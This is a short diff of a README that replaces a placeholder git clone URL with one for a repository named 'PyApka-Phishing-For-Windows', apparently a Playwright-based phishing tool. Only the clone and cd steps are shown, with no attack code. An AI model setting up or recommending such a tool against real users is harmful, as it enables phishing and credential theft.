@@ -14,8 +14,8 @@ Welcome to the repository! This project leverages Python Playwright to control a
 
 1. **Clone the repository:**
     ```sh
-    git clone https://github.com/yourusername/your-repository.git
-    cd your-repository
+    git clone https://github.com/Apkaless/PyApka-Phishing-For-Windows.git
+    cd PyApka-Phishing-For-Windows
     ```
 
 2. **Install the required Python packages:**
